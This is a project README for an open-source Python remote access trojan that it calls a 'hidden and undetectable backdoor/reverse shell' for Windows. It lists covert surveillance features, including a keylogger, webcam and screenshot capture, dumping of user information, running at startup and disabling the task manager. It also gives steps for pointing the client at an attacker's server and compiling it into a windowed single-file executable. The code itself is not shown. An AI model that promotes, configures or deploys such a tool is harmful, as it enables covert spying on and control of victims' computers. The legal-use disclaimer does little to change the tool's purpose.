# Python Backdoor
[![Build status](https://ci.appveyor.com/api/projects/status/5tdy7lpopxpinui9?svg=true)](https://ci.appveyor.com/project/xp4xbox/python-backdoor)

This program is an opensource, hidden and undetectable backdoor/reverse shell/RAT for Windows made in Python 3 which contains many features such as multi-client support and cross-platform server.

## Installation
You will needs:
* [Python 3.6+](https://www.python.org/downloads)
* [Pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/)
* [PyAutoGui](https://pypi.python.org/pypi/PyAutoGUI)
* [Unoffical Pygame](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pygame)
* [VideoCapture](https://www.lfd.uci.edu/~gohlke/pythonlibs/#videocapture)

The program can be downloaded via github or git eg. `git clone https://github.com/xp4xbox/Python-Backdoor`

## Features
Currently this program has several features such as:
* Multi-client support
* Cross-platform server
* Built-in keylogger
* Ability to send command to all clients
* Ability to capture screenshots/webcam snapshots
* Ability to upload/download files
* Ability to send messages
* Ability to run at startup
* Ability to browse files
* Ability to dump user info
* Ability to open remote cmd
* Ability to disable task manager
* Ability to shutdown/restart/lock pc
* Checking for multiple instances
* And more...

## Quick Usage

1. Open client with IDLE or any other editor.
2. Set your IP address in the quotes on line 8 for `strHost` to use for the server or if you plan to use DNS server, on the line below put in your dns hostname such as: `strHost = socket.gethostbyname("myserver113.ddns.net")`.
3. *You must also disable your firewall on the server or configure your firewall to allow port 3000*

> If you plan on using the program outside of your network, you must port forward port 3000.

For more information please refer to the [instructable](https://www.instructables.com/id/Simple-Python-Backdoor/).

### Compiling Client To .exe

#### Pyinstaller
1. Install [Pyinstaller](http://www.pyinstaller.org/downloads.html#).
2. Open command prompt and run `pyinstaller client.py --exclude-module FixTk --exclude-module tcl --exclude-module tk --exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter --onefile --windowed`

## Help

If you need any help at all, feel free to post a "help" issue or a comment on my [instructable](https://www.instructables.com/id/Simple-Python-Backdoor/).

## Contributing

Contributing is encouraged and will help make a better program. Please refer to [this](https://gist.github.com/MarcDiethelm/7303312) before contributing.

## Disclaimer

This program must be used for legal purposes! I am not responsible for anything you do with it.

## License
[License](https://github.com/xp4xbox/Python-Backdoor/blob/master/license)
